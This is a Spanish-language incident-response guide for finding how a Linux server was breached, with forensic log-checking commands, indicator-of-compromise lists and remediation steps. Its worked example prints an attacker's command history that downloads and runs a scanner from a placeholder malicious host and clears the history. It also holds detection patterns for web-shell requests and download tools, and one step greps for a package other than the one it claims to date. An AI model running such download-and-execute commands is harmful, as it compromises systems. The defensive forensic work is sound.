# 🔍 Cómo Identificar el Vector de Entrada del Ataque

## 🎯 Vectores Más Comunes (por Probabilidad)

### 1. SSH con Contraseña Débil (70%)
**Síntomas:**
- Muchos intentos fallidos de login
- Login exitoso desde IP desconocida
- Login a horas inusuales (3 AM)

**Verificar:**
```bash
# Ver últimos logins
last -a | head -30

# Intentos fallidos (brute force)
grep "Failed password" /var/log/auth.log* | wc -l
grep "Failed password" /var/log/auth.log* | awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Logins exitosos desde IPs externas
grep "Accepted password" /var/log/auth.log*

# Ver IPs de logins exitosos
grep "Accepted" /var/log/auth.log* | awk '{print $11}' | sort | uniq
```

**Señales de alerta:**
- 100+ intentos fallidos desde misma IP
- Login exitoso desde IP extranjera (China, Rusia, etc.)
- Login a horas de madrugada

---

### 2. Vulnerabilidad en Aplicación Web (20%)
**Síntomas:**
- Requests HTTP con payloads maliciosos
- File upload exploit
- Command injection

**Verificar:**
```bash
# Ver logs de Nginx/Apache
tail -1000 /var/log/nginx/access.log | grep -E "\.php|shell|cmd|exec"
tail -1000 /var/log/nginx/error.log | grep -i "error"

# Buscar file uploads sospechosos
find /var/www -type f -name "*.php" -mtime -7 -ls
find /var/www -type f -name "shell*" -ls

# Ver requests con user-agents sospechosos
grep -E "python|curl|wget|masscan" /var/log/nginx/access.log | tail -50
```

**Señales de alerta:**
- Requests a `/upload.php`, `/shell.php`, `/cmd.php`
- POST con `base64` en el body
- User-Agent: `python-requests`, `curl`, `wget`

---

### 3. SSH Key Comprometida (5%)
**Síntomas:**
- Login exitoso sin intentos fallidos previos
- Sin log de "Accepted password" (usa key)

**Verificar:**
```bash
# Ver keys autorizadas de root
cat /root/.ssh/authorized_keys

# Ver keys de usuarios
for user in $(ls /home); do
  echo "=== $user ==="
  cat /home/$user/.ssh/authorized_keys 2>/dev/null
done

# Ver logins con key
grep "Accepted publickey" /var/log/auth.log*

# Buscar keys sospechosas (agregadas recientemente)
find /root/.ssh /home/*/.ssh -type f -name "authorized_keys" -mtime -30 -ls
```

**Señales de alerta:**
- Key desconocida en `authorized_keys`
- Key sin comentario o con comentario genérico
- Archivo `authorized_keys` modificado recientemente

---

### 4. Exploit de Servicio Expuesto (3%)
**Síntomas:**
- Servicio con vulnerabilidad conocida (CVE)
- Puerto expuesto a internet

**Verificar:**
```bash
# Ver puertos abiertos
ss -tulpn | grep LISTEN

# Ver versiones de servicios
nginx -v
redis-server --version
mysql --version
node --version

# Buscar CVEs conocidos (comparar con versiones)
```

**Señales de alerta:**
- Redis sin contraseña en :6379
- MySQL en :3306 accesible desde internet
- Webmin/cPanel con versión antigua

---

### 5. Escalación de Privilegios (2%)
**Síntomas:**
- Usuario no-root ejecutó exploit para obtener root
- Kernel exploit

**Verificar:**
```bash
# Ver usuarios con sudo
grep sudo /etc/group

# Ver comandos sudo ejecutados
grep sudo /var/log/auth.log* | tail -50

# Ver kernel version (buscar CVEs)
uname -r

# Buscar archivos con SUID bit (potencial escalación)
find / -perm -4000 -type f 2>/dev/null
```

---

## 🔍 Análisis Rápido Manual

### Paso 1: ¿Desde dónde vino el ataque?

```bash
# Últimos logins
last -a | head -20

# Logins SSH exitosos
grep "Accepted" /var/log/auth.log* | tail -20

# Ver IPs
grep "Accepted" /var/log/auth.log* | awk '{print $11}' | sort | uniq
```

**Si ves IP desconocida → Vector SSH**

---

### Paso 2: ¿Cuándo ocurrió?

```bash
# Fecha de instalación de pnscan
grep "install unhide" /var/log/dpkg.log*
# Output: 2026-02-04 03:56:42

# Buscar actividad a esa hora
grep "2026-02-04 03:" /var/log/auth.log*
grep "2026-02-04 03:" /var/log/syslog
```

---

### Paso 3: ¿Qué hizo el atacante?

```bash
# Historial de comandos (si no lo borró)
cat /root/.bash_history | tail -100

# Archivos descargados
find / -type f -mtime -3 -name "*.sh" 2>/dev/null
find /tmp /var/tmp -type f -mtime -3 -ls 2>/dev/null

# Procesos ejecutados (si quedan en logs)
grep "pnscan" /var/log/syslog
```

---

### Paso 4: ¿Hay persistencia?

```bash
# Cron jobs
crontab -l
ls -la /etc/cron.*

# Servicios systemd
systemctl list-units --all | grep -E "scan|miner|bot"

# SSH keys backdoor
cat /root/.ssh/authorized_keys

# Nuevos usuarios
grep "useradd" /var/log/auth.log*
```

---

## 🚨 Indicadores de Compromiso (IoCs)

### Archivos Maliciosos Comunes
```
/tmp/pnscan
/var/tmp/.ICE-unix/pnscan
/dev/shm/pnscan
/tmp/.system
/tmp/ssh*
/tmp/update.sh
```

### Procesos Maliciosos Comunes
```
pnscan
masscan
nmap -sS
xmrig (cryptominer)
kinsing
kdevtmpfsi
```

### Conexiones Salientes Sospechosas
```
Puerto 6379 (Redis scan)
Puerto 445 (SMB scan)
Puerto 22 (SSH scan)
Puerto 3389 (RDP scan)
Puertos 8000-9000 (mining pools)
```

---

## 📋 Checklist de Análisis

- [ ] Ver últimos logins SSH (`last -a`)
- [ ] Ver intentos fallidos de SSH (`grep "Failed password" /var/log/auth.log*`)
- [ ] Ver logins exitosos desde IPs inusuales
- [ ] Revisar `/root/.ssh/authorized_keys`
- [ ] Ver historial de comandos (`cat /root/.bash_history`)
- [ ] Buscar archivos modificados en `/tmp` (últimas 48h)
- [ ] Buscar binario de `pnscan` (`find / -name "*pnscan*"`)
- [ ] Ver cron jobs de root (`crontab -l`)
- [ ] Ver puertos abiertos (`ss -tulpn`)
- [ ] Ver conexiones salientes activas (`ss -tn`)
- [ ] Revisar logs de Nginx/Apache
- [ ] Ver paquetes instalados recientemente (`grep install /var/log/dpkg.log`)
- [ ] Verificar usuarios del sistema (`cat /etc/passwd`)
- [ ] Buscar servicios systemd sospechosos

---

## 🛠️ Script Automatizado

Ejecutar:
```bash
cd /var/www/track
chmod +x analisis-forense.sh
./analisis-forense.sh > forense-output.txt 2>&1

# Ver resultado
less forense-output.txt

# Buscar palabras clave
grep -i "accepted\|failed\|suspicious\|error" forense-output.txt
```

---

## 💡 Ejemplo Real: Ataque por SSH

```bash
$ grep "Accepted" /var/log/auth.log
Feb 04 03:45:12 server sshd[12345]: Accepted password for root from 123.45.67.89 port 54321
                                                                      ^^^^^^^^^^^^^^
                                                                      IP atacante

$ whois 123.45.67.89
Country: CN (China) ← Sospechoso
Organization: China Telecom

$ cat /root/.bash_history
wget http://malicious-site.com/pnscan
chmod +x pnscan
./pnscan &
history -c  ← Intentó borrar historial (no funcionó)
```

---

## 🎯 Acciones Posteriores

Una vez identificado el vector:

### Si fue SSH:
1. Cambiar TODAS las contraseñas
2. Deshabilitar password auth en SSH
3. Usar solo SSH keys
4. Configurar fail2ban
5. Limitar IPs permitidas

### Si fue aplicación web:
1. Actualizar todas las aplicaciones
2. Patchear vulnerabilidades
3. Validar inputs
4. Deshabilitar file uploads
5. WAF (Web Application Firewall)

### Si fue key comprometida:
1. Revocar todas las keys
2. Generar nuevas keys
3. Auditar `authorized_keys`
4. Rotar credenciales

### Si fue servicio expuesto:
1. Cerrar puertos innecesarios
2. Actualizar servicios
3. Usar firewall restrictivo
4. VPN para acceso admin

---

## 📚 Referencias

- [SANS Incident Response Cheat Sheet](https://www.sans.org/posters/incident-response-cheat-sheet/)
- [Linux Forensics Guide](https://github.com/ashemery/LinuxForensics)
- [SSH Attack Detection](https://www.ssh.com/academy/ssh/attack)
